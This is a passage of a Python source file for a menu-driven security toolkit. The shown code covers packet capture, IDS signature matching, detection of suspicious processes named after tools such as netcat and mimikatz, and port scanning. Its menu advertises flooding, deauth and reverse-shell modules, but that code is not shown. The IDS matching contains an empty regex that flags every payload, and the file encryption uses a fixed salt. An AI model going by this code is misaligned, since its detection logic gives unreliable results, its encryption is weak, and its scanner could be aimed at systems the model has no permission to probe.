#!/usr/bin/env python3
"""
Darkie Security Suite v5 — Next-Gen Cybersecurity & Network Defense Platform
Educational use only. Test only systems you own or have permission to test.
v5 adds the Native Toolbox: auto-detects the security tools installed on your
OS (nmap, sqlmap, hydra, hashcat, metasploit, ...) and launches them ready-to-use
from one menu.
"""

import argparse
import base64
import csv
import hashlib
import json
import os
import platform
import random
import re
import shutil
import socket
import sqlite3
import ssl
import string
import struct
import subprocess
import sys
import threading
import time
import warnings
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime as dt

warnings.filterwarnings("ignore")

VERSION = "5.0.0"
APP_NAME = "Darkie TOOLS v5"
SAVE_DIR = os.path.expanduser("~/.darkie_reports")

# ── ANSI ──────────────────────────────────────────────
RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
GRADIENT = [
    "\033[38;5;196m", "\033[38;5;197m", "\033[38;5;198m", "\033[38;5;199m",
    "\033[38;5;200m", "\033[38;5;201m", "\033[38;5;129m", "\033[38;5;93m",
]

# ── Symbols ───────────────────────────────────────────
SYM_CHECK = "\u2713"
SYM_X = "\u2717"
SYM_WARN = "\u26a0"
SYM_ARROW = "\u2192"
SYM_PROMPT = "\u279c"
SYM_BLOCK_FULL = "\u2588"
SYM_BLOCK_EMPTY = "\u2591"
SYM_BOX_TL = "\u2554"
SYM_BOX_TR = "\u2557"
SYM_BOX_BL = "\u255a"
SYM_BOX_BR = "\u255d"
SYM_BOX_H = "\u2550"
SYM_BOX_V = "\u2551"
SYM_LINE_H = "\u2500"
SYM_CLOCK = "\u23f0"

LOG_ALERTS = []

# ── Optional imports (best-effort) ────────────────────
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False
try:
    import requests
except ImportError:
    requests = None
try:
    import scapy.all as scapy
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


def _ensure_save_dir():
    os.makedirs(SAVE_DIR, exist_ok=True)


def add_log_alert(level, source, message):
    LOG_ALERTS.append({
        "timestamp": dt.now().strftime("%Y-%m-%d %H:%M:%S"),
        "level": level,
        "source": source,
        "message": message,
    })


# ── Display helpers ───────────────────────────────────
def c(text, color=GREEN):
    return f"{color}{BOLD}{text}{RESET}"


def dim(text):
    return f"{DIM}{text}{RESET}"


def c_dim(text, color=GREEN):
    return f"{color}{DIM}{text}{RESET}"


def gradient_line(line):
    out = ""
    for i, ch in enumerate(line):
        idx = min(i % len(GRADIENT), len(GRADIENT) - 1)
        out += f"{GRADIENT[idx]}{BOLD}{ch}{RESET}"
    return out


def header_box(title, color=CYAN, width=66):
    top = f"{color}{BOLD}{SYM_BOX_TL}{'='*(width-2)}{SYM_BOX_TR}{RESET}"
    mid = f"{color}{BOLD}{SYM_BOX_V} {title.center(width-4)} {SYM_BOX_V}{RESET}"
    bot = f"{color}{BOLD}{SYM_BOX_BL}{'='*(width-2)}{SYM_BOX_BR}{RESET}"
    print(f"\n{top}\n{mid}\n{bot}\n")


def progress_bar(current, total, bar_len=16):
    filled = int(bar_len * current // total) if total else 0
    bar = f"{GREEN}{SYM_BLOCK_FULL*filled}{DIM}{SYM_BLOCK_EMPTY*(bar_len-filled)}{RESET}"
    return f"[{bar}] {CYAN}{current}/{total}{RESET}"


SPINNER_CHARS = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]


class spinner:
    """Animated spinner shown while a blocking task runs."""

    def __init__(self, message="Working", color=CYAN):
        self.message = message
        self.color = color
        self._stop = threading.Event()
        self._t = None

    def __enter__(self):
        self._t = threading.Thread(target=self._run, daemon=True)
        self._t.start()
        return self

    def __exit__(self, *exc):
        self._stop.set()
        self._t.join(timeout=0.2)
        sys.stdout.write(f"\r{' ' * (len(self.message) + 12)}\r")
        sys.stdout.flush()

    def _run(self):
        i = 0
        while not self._stop.is_set():
            ch = SPINNER_CHARS[i % len(SPINNER_CHARS)]
            sys.stdout.write(f"\r  {self.color}{ch}{RESET} {self.message}")
            sys.stdout.flush()
            i += 1
            self._stop.wait(0.12)


def typewriter(text, color=GREEN, delay=0.012):
    for ch in text:
        sys.stdout.write(f"{color}{ch}{RESET}")
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write("\n")
    sys.stdout.flush()


def live_status_line():
    parts = [f"{SYM_CLOCK} {dt.now().strftime('%H:%M:%S')}"]
    if HAS_PSUTIL:
        try:
            up = dt.now() - dt.fromtimestamp(psutil.boot_time())
            parts.append(f"UP {int(up.total_seconds()//3600)}h{int((up.total_seconds()%3600)//60):02d}m")
            parts.append(f"CPU {psutil.cpu_percent(interval=0.2):.0f}%")
            parts.append(f"RAM {psutil.virtual_memory().percent:.0f}%")
        except Exception:
            pass
    try:
        parts.append(f"IP {socket.gethostbyname(socket.gethostname())}")
    except Exception:
        pass
    return "  •  ".join(parts)


def _is_ip(s):
    try:
        socket.inet_aton(s)
        return True
    except OSError:
        return False


# ── Module registry (drives menu, web, GUI) ───────────
MODULES = [
    {"id": "net", "key": "1", "name": "Network & Threat Monitoring", "desc": "capture · IDS · arp · port-scan · ddos", "color": RED},
    {"id": "endpoint", "key": "2", "name": "Endpoint Security", "desc": "processes · files · connections", "color": MAGENTA},
    {"id": "vuln", "key": "3", "name": "Vulnerability Management", "desc": "scan · CVE · assess · config", "color": BLUE},
    {"id": "data", "key": "4", "name": "Data Protection", "desc": "aes-256 · passwords · brute-detect", "color": YELLOW},
    {"id": "pentest", "key": "5", "name": "Ethical Pentest", "desc": "sqli · xss · takeover · login", "color": GREEN},
    {"id": "siem", "key": "6", "name": "SIEM & Logs", "desc": "analyze · monitor · alerts", "color": CYAN},
    {"id": "stress", "key": "7", "name": "Stress Testing", "desc": "minecraft · web · ip flood", "color": RED},
    {"id": "osint", "key": "8", "name": "OSINT Recon", "desc": "phone · email · geo · dns · sub", "color": YELLOW},
    {"id": "telephone", "key": "9", "name": "Telephone Tools", "desc": "analyze · format · codes", "color": MAGENTA},
    {"id": "netutils", "key": "10", "name": "Network Utilities", "desc": "ports · ssl · headers · ping · trace", "color": BLUE},
    {"id": "hashcrypto", "key": "11", "name": "Hash & Crypto", "desc": "generate · identify · crack · encode", "color": CYAN},
    {"id": "audit", "key": "12", "name": "System Audit", "desc": "rootkit · suid · cron · kernel", "color": RED},
    {"id": "advnet", "key": "13", "name": "Advanced Network", "desc": "knock · banner · revshell · lan", "color": BLUE},
    {"id": "advosint", "key": "14", "name": "Advanced OSINT", "desc": "censys · shodan · ct · dork", "color": YELLOW},
    {"id": "wifi", "key": "15", "name": "WiFi & Wireless", "desc": "scan · audit · deauth · wpa", "color": MAGENTA},
    {"id": "reports", "key": "16", "name": "Reports", "desc": "html · json · csv export", "color": CYAN},
    {"id": "gui", "key": "17", "name": "Graphical Interfaces", "desc": "web dashboard · desktop app", "color": GREEN},
    {"id": "native", "key": "18", "name": "Native Toolbox", "desc": "detect & launch installed OS security tools", "color": MAGENTA},
]
MODULE_MAP = {m["id"]: m for m in MODULES}
KEY_MAP = {m["key"]: m for m in MODULES}


def _menu_loop(menu_id, title, items, color=CYAN):
    """Generic animated menu loop. items: list of (key, label, handler)."""
    handlers = {k: h for k, _, h in items}
    while True:
        header_box(title, color)
        for key, label, *_ in items:
            if key == "b":
                print(f"  {c('[b]', YELLOW)}  {label}")
            else:
                print(f"  {c(f'[{key}]', GREEN)}  {label}")
        print()
        try:
            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip().lower()
            if ch == "b":
                break
            handler = handlers.get(ch)
            if handler:
                handler()
            else:
                print(f"  {RED}Invalid choice.{RESET}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")


def _get(text, default=""):
    v = input(f"  {c(f'{text} {SYM_PROMPT} ', CYAN)}").strip()
    return v if v else default


def _get_int(text, default):
    v = input(f"  {c(f'{text} (default {default}) {SYM_PROMPT} ', CYAN)}").strip()
    return int(v) if v.isdigit() else default


def _yes(text, default=True):
    prompt = "Y/n" if default else "y/N"
    v = input(f"  {c(f'{text} ({prompt}) {SYM_PROMPT} ', CYAN)}").strip().lower()
    if not v:
        return default
    return v in ("y", "yes")


def _is_root():
    if platform.system().lower() == "windows":
        try:
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False
    return os.geteuid() == 0


def _run(cmd, timeout=10, text=True):
    try:
        r = subprocess.run(cmd, capture_output=True, text=text, timeout=timeout, errors="replace")
        return r
    except Exception:
        return None


def _which(tool):
    return shutil.which(tool)


def _run_as_admin(cmd_list, reason=""):
    """Run a command with sudo on POSIX when not root. Returns bool success."""
    desc = " ".join(cmd_list)
    print(f"  {CYAN}{reason or desc}{RESET}")
    if not _is_root() and os.name == "posix" and _which("sudo"):
        cmd_list = ["sudo"] + cmd_list
    try:
        r = subprocess.run(cmd_list, capture_output=True, text=True, timeout=300, errors="replace")
        if r.returncode == 0:
            print(f"  {GREEN}{SYM_CHECK}  Success{RESET}")
        else:
            print(f"  {RED}{SYM_X}  Failed (exit {r.returncode}){RESET}")
            if r.stderr.strip():
                for line in r.stderr.strip().splitlines()[-3:]:
                    print(f"    {RED}{line}{RESET}")
        return r.returncode == 0
    except Exception as e:
        print(f"  {RED}{SYM_X}  Error: {e}{RESET}")
        return False


def _check_root(require_scapy=False):
    if require_scapy and not HAS_SCAPY:
        print(f"  {YELLOW}scapy not installed — install with: pip install scapy{RESET}")
        return False
    if not _is_root():
        print(f"  {YELLOW}{SYM_WARN} Root/admin privileges recommended for this feature.{RESET}")
    return True


# ══════════════════════════════════════════════════════
#  MODULE 1: NETWORK & THREAT MONITORING
# ══════════════════════════════════════════════════════

def _detect_interfaces():
    ifaces = []
    system = platform.system().lower()
    try:
        if system == "linux":
            r = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
            ifaces = [i for i in re.findall(r'^\d+:\s+(\w+)', r.stdout, re.MULTILINE) if i != "lo"]
            if not ifaces:
                r = subprocess.run(["ifconfig", "-a"], capture_output=True, text=True)
                ifaces = [i for i in re.findall(r'^(\w+)\s+:', r.stdout, re.MULTILINE) if i != "lo"]
        elif system == "darwin":
            r = subprocess.run(["ifconfig", "-l"], capture_output=True, text=True)
            ifaces = [i for i in r.stdout.strip().split() if i != "lo0"]
        elif system == "windows":
            r = subprocess.run(["ipconfig"], capture_output=True, text=True, encoding="utf-8", errors="replace")
            ifaces = re.findall(r'Adapter (\S.+):', r.stdout)
    except Exception:
        pass
    return ifaces or (["eth0"] if system == "linux" else ["en0"])


def net_capture():
    header_box("Packet Capture & Analysis", RED)
    if not _check_root(require_scapy=True):
        return
    ifaces = _detect_interfaces()
    if len(ifaces) > 1:
        print(f"  {c('Available interfaces:', CYAN)}")
        for i, iface in enumerate(ifaces, 1):
            print(f"    {c(f'[{i}]', GREEN)} {iface}")
        choice = input(f"\n  {c(f'Select interface {SYM_PROMPT} ', CYAN)}").strip()
        iface = ifaces[int(choice) - 1] if choice.isdigit() and 1 <= int(choice) <= len(ifaces) else ifaces[0]
    else:
        iface = ifaces[0] if ifaces else "eth0"
    count = _get_int("Packets to capture", 50)
    print(f"\n  {c(f'Capturing {count} packets on {iface}... Ctrl+C to stop', RED)}")
    print(f"  {c(SYM_LINE_H*50, CYAN)}")
    captured = 0
    start = time.time()
    try:
        packets = scapy.sniff(iface=iface, count=count, timeout=30)
        for pkt in packets:
            captured += 1
            ts = dt.now().strftime("%H:%M:%S.%f")[:-3]
            summary = pkt.summary()[:77]
            print(f"  {c(f'[{ts}]', GREEN)} {c(summary, CYAN)}")
            if pkt.haslayer(scapy.IP):
                src = pkt[scapy.IP].src
                dst = pkt[scapy.IP].dst
                if pkt.haslayer(scapy.TCP):
                    dport = pkt[scapy.TCP].dport
                    if dport == 22:
                        add_log_alert("INFO", "Capture", f"SSH: {src}->{dst}")
                    if dport in (23, 3389):
                        add_log_alert("WARN", "Capture", f"Remote access: {src}->{dst}:{dport}")
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"  {RED}{SYM_X} Capture error: {e}{RESET}")
    print(f"  {c(f'Captured {captured} packets in {time.time()-start:.1f}s', GREEN)}\n")


def net_traffic_monitor():
    header_box("Real-time Traffic Monitor", RED)
    if not HAS_PSUTIL:
        print(f"  {YELLOW}psutil required: pip install psutil{RESET}")
        return
    dur = _get_int("Monitor duration (seconds)", 15)
    print(f"  {c(f'Monitoring traffic for {dur}s... Ctrl+C to stop', CYAN)}")
    print(f"  {c(SYM_LINE_H*50, CYAN)}")
    start = time.time()
    prev = {}
    try:
        while time.time() - start < dur:
            net = psutil.net_io_counters(pernic=True)
            for nic, counters in net.items():
                if not nic:
                    continue
                cur = (counters.bytes_sent, counters.bytes_recv)
                p = prev.get(nic)
                prev[nic] = cur
                if p:
                    up = cur[0] - p[0]
                    dn = cur[1] - p[1]
                    if up or dn:
                        print(f"  {c(nic, GREEN):12s} up {c(f'{up/1024:.1f}KB', YELLOW):>10s}  down {c(f'{dn/1024:.1f}KB', CYAN):>10s}")
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    print()


def net_ids():
    header_box("IDS Signature Detection", RED)
    if not _check_root(require_scapy=True):
        return
    dur = _get_int("Monitor duration (seconds)", 15)
    sigs = 0
    patterns = {
        "SQLi": re.compile(rb"(union\s+select|or\s+1=1|'--)", re.I),
        "XSS": re.compile(rb"(<script|javascript:|onerror=)", re.I),
        "PortScan": re.compile(rb""),
        "BruteForce": re.compile(rb"(login|password)", re.I),
    }
    print(f"  {c(f'Listening for {dur}s...', CYAN)}")
    try:
        def handle(pkt):
            nonlocal sigs
            try:
                if pkt.haslayer(scapy.Raw):
                    payload = bytes(pkt[scapy.Raw].load)
                    for name, pat in patterns.items():
                        if pat and pat.search(payload):
                            src = pkt[scapy.IP].src if pkt.haslayer(scapy.IP) else "?"
                            print(f"  {RED}{SYM_WARN} [{name}] {src}{RESET}")
                            add_log_alert("HIGH", "IDS", f"{name} signature from {src}")
                            sigs += 1
            except Exception:
                pass
        scapy.sniff(prn=handle, timeout=dur, store=False)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"  {RED}{SYM_X} {e}{RESET}")
    print(f"  {c(f'Done: {sigs} signatures matched', GREEN if sigs == 0 else YELLOW)}\n")


def net_arp_detect():
    header_box("ARP Spoofing Detector", RED)
    if not _check_root(require_scapy=True):
        return
    if not _which("ip") and platform.system().lower() != "windows":
        print(f"  {YELLOW}ip command required.{RESET}")
        return
    print(f"  {c('Watching for ARP inconsistencies (Ctrl+C to stop)...', CYAN)}")
    seen = {}
    try:
        def handle(pkt):
            if pkt.haslayer(scapy.ARP):
                src_ip = pkt[scapy.ARP].psrc
                src_mac = pkt[scapy.ARP].hwsrc
                if src_ip in seen and seen[src_ip] != src_mac:
                    print(f"  {RED}{SYM_WARN} ARP SPOOF: {src_ip} has {src_mac} but was {seen[src_ip]}{RESET}")
                    add_log_alert("CRITICAL", "ARP", f"Spoof detected: {src_ip} @ {src_mac}")
                else:
                    seen[src_ip] = src_mac
        scapy.sniff(filter="arp", prn=handle, store=False)
    except KeyboardInterrupt:
        pass
    print(f"  {c('Monitoring stopped.', GREEN)}\n")


def net_portscan_detect():
    header_box("Port Scan Detector", RED)
    if not _check_root(require_scapy=True):
        return
    dur = _get_int("Monitor duration (seconds)", 20)
    hits = defaultdict(int)
    print(f"  {c(f'Detecting port scans for {dur}s...', CYAN)}")
    try:
        def handle(pkt):
            if pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.IP):
                flags = pkt[scapy.TCP].flags
                if flags == 2 or flags == 18:  # SYN or SYN-ACK
                    hits[pkt[scapy.IP].src] += 1
        scapy.sniff(filter="tcp", prn=handle, timeout=dur, store=False)
    except KeyboardInterrupt:
        pass
    print(f"\n  {c('Top sources:', CYAN)}")
    for src, n in sorted(hits.items(), key=lambda x: -x[1])[:10]:
        danger = n > 20
        print(f"    {c(src, RED if danger else GREEN):20s} {c(str(n), CYAN)} packets")
        if danger:
            add_log_alert("HIGH", "PortScan", f"Possible scan from {src} ({n} packets)")
    print()


def net_ddos_detect():
    header_box("DDoS Detection", RED)
    if not HAS_PSUTIL:
        print(f"  {YELLOW}psutil required: pip install psutil{RESET}")
        return
    dur = _get_int("Monitor duration (seconds)", 15)
    start = time.time()
    bytes_before = psutil.net_io_counters().bytes_recv
    print(f"  {c(f'Monitoring inbound traffic for {dur}s...', CYAN)}")
    time.sleep(dur)
    bytes_after = psutil.net_io_counters().bytes_recv
    delta = bytes_after - bytes_before
    rate = delta / dur / 1024 / 1024
    print(f"\n  Received: {c(f'{delta/1024/1024:.2f} MB', CYAN)} in {dur}s")
    print(f"  Rate:     {c(f'{rate:.2f} MB/s', RED if rate > 1 else GREEN)}")
    if rate > 1:
        print(f"  {RED}{SYM_WARN} Possible DDoS/network saturation!{RESET}")
        add_log_alert("HIGH", "DDoS", f"Inbound rate {rate:.2f} MB/s")
    else:
        print(f"  {GREEN}{SYM_CHECK} Traffic within normal range.{RESET}")
    print()


def menu_net():
    _menu_loop("net", "Network & Threat Monitoring", [
        ("1", "Packet Capture & Analysis", net_capture),
        ("2", "Real-time Traffic Monitor", net_traffic_monitor),
        ("3", "IDS Signature Detection", net_ids),
        ("4", "ARP Spoofing Detector", net_arp_detect),
        ("5", "Port Scan Detector", net_portscan_detect),
        ("6", "DDoS Detection", net_ddos_detect),
        ("b", "Back to main menu", None),
    ], RED)


# ══════════════════════════════════════════════════════
#  MODULE 2: ENDPOINT SECURITY
# ══════════════════════════════════════════════════════

def ep_process_monitor():
    header_box("Process Monitor", MAGENTA)
    if not HAS_PSUTIL:
        print(f"  {YELLOW}psutil required: pip install psutil{RESET}")
        return
    n = _get_int("Top N processes", 15)
    print(f"  {c(f'Top {n} processes by CPU:', CYAN)}")
    print(f"  {c(SYM_LINE_H*50, CYAN)}")
    for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
        try:
            p.cpu_percent(None)
        except Exception:
            pass
    time.sleep(1)
    rows = []
    for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
        try:
            rows.append((p.info["name"], p.info["pid"], p.info["cpu_percent"] or 0, p.info["memory_percent"] or 0))
        except Exception:
            pass
    for name, pid, cpu, mem in sorted(rows, key=lambda x: -x[2])[:n]:
        print(f"  {c(f'{name[:22]:22s}', GREEN)} PID {c(f'{pid:6d}', CYAN)} CPU {c(f'{cpu:6.1f}%', YELLOW)} MEM {c(f'{mem:5.1f}%', MAGENTA)}")
    print()


def ep_suspicious_processes():
    header_box("Suspicious Process Detector", MAGENTA)
    if not HAS_PSUTIL:
        print(f"  {YELLOW}psutil required: pip install psutil{RESET}")
        return
    suspicious = {"cmd.exe": "shell", "powershell": "shell", "bash": "shell", "sh": "shell",
                  "nc": "netcat", "netcat": "netcat", "ncat": "netcat", "socat": "socat",
                  "python": "python", "python3": "python", "perl": "perl", "ruby": "ruby",
                  "php": "php", "ncrack": "ncrack", "hydra": "hydra", "medusa": "medusa",
                  "mimikatz": "mimikatz", "xterm": "xterm", "telnet": "telnet"}
    found = 0
    for p in psutil.process_iter(["pid", "name"]):
        try:
            name = (p.info["name"] or "").lower()
            base = name.split(".")[0] if platform.system().lower() == "windows" else name
            if base in suspicious:
                print(f"  {RED}{SYM_WARN} {p.info['name']} (PID {p.info['pid']}) — {suspicious[base]}{RESET}")
                add_log_alert("WARN", "Endpoint", f"Suspicious process: {p.info['name']} (PID {p.info['pid']})")
                found += 1
        except Exception:
            pass
    if not found:
        print(f"  {GREEN}{SYM_CHECK} No suspicious processes found.{RESET}")
    print()


def ep_file_integrity():
    header_box("File Integrity Checker", MAGENTA)
    target = _get("Directory to check", os.path.expanduser("~"))
    if not os.path.isdir(target):
        print(f"  {RED}{SYM_X} Not a directory.{RESET}")
        return
    db_path = os.path.join(SAVE_DIR, "integrity.db")
    _ensure_save_dir()
    conn = sqlite3.connect(db_path)
    table = f"snap_{abs(hash(target)) % (10**8)}"
    conn.execute(f"CREATE TABLE IF NOT EXISTS {table} (path TEXT PRIMARY KEY, h TEXT, size INT)")
    if not _yes("Record a new baseline (overwrites old)?"):
        try:
            old = dict(conn.execute(f"SELECT path, h FROM {table}").fetchall())
        except Exception:
            print(f"  {RED}No baseline found.{RESET}")
            return
        print(f"  {c('Scanning for changes...', CYAN)}")
        changed = 0
        for root, dirs, files in os.walk(target):
            for fname in files:
                fp = os.path.join(root, fname)
                try:
                    h = hashlib.sha256(open(fp, "rb").read(1048576)).hexdigest()
                except Exception:
                    continue
                rel = fp
                if rel in old and old[rel] != h:
                    print(f"  {YELLOW}{SYM_WARN} CHANGED: {rel}{RESET}")
                    changed += 1
                    add_log_alert("WARN", "Integrity", f"File changed: {rel}")
        print(f"  {c(f'Done: {changed} files changed', GREEN if changed == 0 else YELLOW)}")
    else:
        print(f"  {c('Recording baseline (walking tree)...', CYAN)}")
        n = 0
        for root, dirs, files in os.walk(target):
            for fname in files:
                fp = os.path.join(root, fname)
                try:
                    data = open(fp, "rb").read(1048576)
                    h = hashlib.sha256(data).hexdigest()
                    size = os.path.getsize(fp)
                    conn.execute(f"INSERT OR REPLACE INTO {table} VALUES (?,?,?)", (fp, h, size))
                    n += 1
                except Exception:
                    pass
        conn.commit()
        print(f"  {GREEN}{SYM_CHECK} Baseline recorded ({n} files).{RESET}")
    conn.close()
    print()


def ep_network_connections():
    header_box("Network Connections", MAGENTA)
    if not HAS_PSUTIL:
        print(f"  {YELLOW}psutil required: pip install psutil{RESET}")
        return
    try:
        for cn in psutil.net_connections(kind="inet"):
            laddr = f"{cn.laddr.ip}:{cn.laddr.port}" if cn.laddr else "?"
            raddr = f"{cn.raddr.ip}:{cn.raddr.port}" if cn.raddr else "-"
            pname = ""
            if cn.pid:
                try:
                    pname = psutil.Process(cn.pid).name()
                except Exception:
                    pname = str(cn.pid)
            print(f"  {c(f'{cn.status:12s}', GREEN if cn.status in ('ESTABLISHED','LISTEN') else YELLOW)} {c(laddr, CYAN):22s} -> {c(raddr, MAGENTA):22s} {c(pname, BLUE)}")
    except Exception as e:
        print(f"  {RED}{SYM_X} {e}{RESET}")
    print()


def menu_endpoint():
    _menu_loop("endpoint", "Endpoint Security", [
        ("1", "Process Monitor", ep_process_monitor),
        ("2", "Suspicious Process Detector", ep_suspicious_processes),
        ("3", "File Integrity Checker", ep_file_integrity),
        ("4", "Network Connection Monitor", ep_network_connections),
        ("b", "Back to main menu", None),
    ], MAGENTA)


# ══════════════════════════════════════════════════════
#  MODULE 3: VULNERABILITY MANAGEMENT
# ══════════════════════════════════════════════════════

def _is_port_open(ip, port, timeout=1.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((ip, port))
        s.close()
        return r == 0
    except Exception:
        return False


def vuln_advanced_scan():
    header_box("Advanced Port Scanner", BLUE)
    target = _get("Target IP/domain")
    if not target:
        return
    try:
        ip = socket.gethostbyname(target)
    except Exception:
        print(f"  {RED}Could not resolve.{RESET}")
        return
    ports = _get("Ports (comma/range, e.g. 1-1000 or 22,80,443)", "common")
    if ports == "common":
        plist = list(range(1, 1024)) + [1433, 1521, 2049, 2375, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9090, 9200, 11211, 25565, 27017]
    elif "-" in ports:
        a, b = ports.split("-")
        plist = list(range(int(a), int(b) + 1))
    else:
        plist = [int(p) for p in ports.split(",") if p.strip()]
    print(f"  {c(f'Scanning {ip} ({len(plist)} ports)...', CYAN)}")
    print(f"  {c(SYM_LINE_H*50, CYAN)}")
    open_ports = []
    done = 0
    with ThreadPoolExecutor(max_workers=200) as ex:
        fs = {ex.submit(_is_port_open, ip, p): p for p in plist}
        for f in as_completed(fs):
            p = fs[f]
            done += 1
            if f.result():
                svc = "?"
                try:
                    svc = socket.getservbyport(p)
                except Exception:
                    pass
                open_ports.append((p, svc))
                print(f"  {GREEN}{SYM_CHECK} {p:5d}/tcp  {svc}{RESET}")
            if done % 100 == 0:
                sys.stdout.write(f"\r  {progress_bar(done, len(plist))}  ")
                sys.stdout.flush()
    print(f"\n  {c(f'Scan complete: {len(open_ports)} open ports', GREEN)}")
    add_log_alert("INFO", "PortScan", f"{ip}: {len(open_ports)} open ports")
    print()


def vuln_cve_lookup():
    header_box("CVE Lookup", BLUE)
    cve_id = _get("CVE ID (e.g. CVE-2024-12345)")
    if not cve_id:
        return
    cve_id = cve_id.upper()
    if not re.match(r'^CVE-\d{4}-\d{4,}$', cve_id):
        print(f"  {RED}{SYM_X} Invalid CVE format.{RESET}")
        return
    url = f"https://cve.circl.lu/api/cve/{cve_id}"
    with spinner(f"Querying CIRCL API for {cve_id}...", BLUE):
        try:
            r = requests.get(url, timeout=15)
        except Exception:
            print(f"  {RED}{SYM_X} Network error.{RESET}")
            return
    if r.status_code != 200:
        print(f"  {YELLOW}{SYM_WARN} CVE not found or API unavailable (HTTP {r.status_code}).{RESET}")
        return
    try:
        d = r.json()
    except Exception:
        print(f"  {RED}{SYM_X} Bad API response.{RESET}")
        return
    cvss = d.get("cvss", 0)
    sev = "UNKNOWN"
    if isinstance(cvss, (int, float)):
        sev = "CRITICAL" if cvss >= 9 else "HIGH" if cvss >= 7 else "MEDIUM" if cvss >= 4 else "LOW"
    print(f"\n  {c(cve_id, GREEN)} — {c(sev, RED if sev == 'CRITICAL' else YELLOW if sev in ('HIGH', 'MEDIUM') else GREEN)}")
    print(f"  {c(SYM_LINE_H*50, CYAN)}")
    print(f"  {c('CVSS:', GREEN)} {cvss}")
    print(f"  {c('Published:', GREEN)} {d.get('Published', '?')}")
    print(f"  {c('Summary:', GREEN)} {d.get('summary', 'n/a')[:200]}")
    print(f"  {c('References:', GREEN)} {', '.join(d.get('references', [])[:3])}")
    add_log_alert("INFO", "CVE", f"{cve_id} CVSS {cvss}")
    print()


def vuln_assessment():
    header_box("Vulnerability Assessment", BLUE)
    target = _get("Target IP/domain")
    if not target:
        return
    try:
        ip = socket.gethostbyname(target)
    except Exception:
        print(f"  {RED}Could not resolve.{RESET}")
        return
    nmap = _which("nmap")
    if nmap:
        with spinner(f"Running nmap against {target}...", BLUE):
            r = _run([nmap, "-sV", "--version-light", "-T4", target], timeout=120)
        if r and r.returncode == 0:
            for line in r.stdout.splitlines():
                if re.search(r'(open|filtered)\s+\S+', line) and not line.startswith("#"):
                    print(f"  {c(line.strip()[:100], CYAN)}")
        else:
            print(f"  {YELLOW}nmap scan failed (no output).{RESET}")
    else:
        print(f"  {YELLOW}nmap not installed — running basic port scan instead.{RESET}")
        vuln_advanced_scan()
    print()


def vuln_config_check():
    header_box("Security Config Checker", BLUE)
    system = platform.system().lower()
    if system == "linux":
        checks = [
            ("SSH root login disabled", "sshd_config", r'^PermitRootLogin\s+(yes|prohibit-password)', False),
            ("Password auth disabled", "sshd_config", r'^PasswordAuthentication\s+yes', False),
        ]
        for desc, fname, pat, expect_true in checks:
            path = os.path.join("/etc/ssh", fname)
            ok = True
            if os.path.exists(path):
                content = open(path).read()
                for line in content.splitlines():
                    line = line.strip()
                    if line and not line.startswith("#") and re.match(pat, line, re.I):
                        ok = False
            print(f"  {c(SYM_CHECK if ok else SYM_X, GREEN if ok else RED)} {desc}")
            if not ok:
                add_log_alert("WARN", "Config", desc)
    else:
        print(f"  {YELLOW}Config checks currently target Linux SSHd.{RESET}")
    print()


def menu_vuln():
    _menu_loop("vuln", "Vulnerability Management", [
        ("1", "Advanced Port Scanner", vuln_advanced_scan),
        ("2", "CVE Lookup", vuln_cve_lookup),
        ("3", "Vulnerability Assessment (nmap)", vuln_assessment),
        ("4", "Security Config Checker", vuln_config_check),
        ("b", "Back to main menu", None),
    ], BLUE)


# ══════════════════════════════════════════════════════
#  MODULE 4: DATA PROTECTION
# ══════════════════════════════════════════════════════

def data_encrypt():
    header_box("File Encryption / Decryption (AES-256)", YELLOW)
    path = _get("File path")
    if not path or not os.path.exists(path):
        print(f"  {RED}{SYM_X} File not found.{RESET}")
        return
    try:
        from cryptography.fernet import Fernet
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    except ImportError:
        print(f"  {RED}cryptography not installed: pip install cryptography{RESET}")
        return
    password = _get("Password")
    if not password:
        return
    mode = _get("Mode (encrypt/decrypt)", "encrypt").lower()
    salt = b"darkie-salt-v5"
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    f = Fernet(key)
    out_path = path + ".enc" if mode == "encrypt" else path[:-4] if path.endswith(".enc") else path + ".dec"
    try:
        data = open(path, "rb").read()
        result = f.encrypt(data) if mode == "encrypt" else f.decrypt(data)
        with open(out_path, "wb") as fh:
            fh.write(result)
        print(f"  {GREEN}{SYM_CHECK} {'Encrypted' if mode == 'encrypt' else 'Decrypted'}: {out_path}")
    except Exception as e:
        print(f"  {RED}{SYM_X} {e}{RESET}")
    print()


def data_password_strength():
    header_box("Password Strength Analyzer", YELLOW)
    pwd = input(f"  {c(f'Password {SYM_PROMPT} ', CYAN)}")
    if not pwd:
        return
    length = len(pwd)
    has_lower = any(c.islower() for c in pwd)
    has_upper = any(c.isupper() for c in pwd)
    has_digit = any(c.isdigit() for c in pwd)
    has_sym = any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in pwd)
    score = 0
    if length >= 8: score += 1
    if length >= 12: score += 1
    if has_lower and has_upper: score += 1
    if has_digit: score += 1
    if has_sym: score += 1
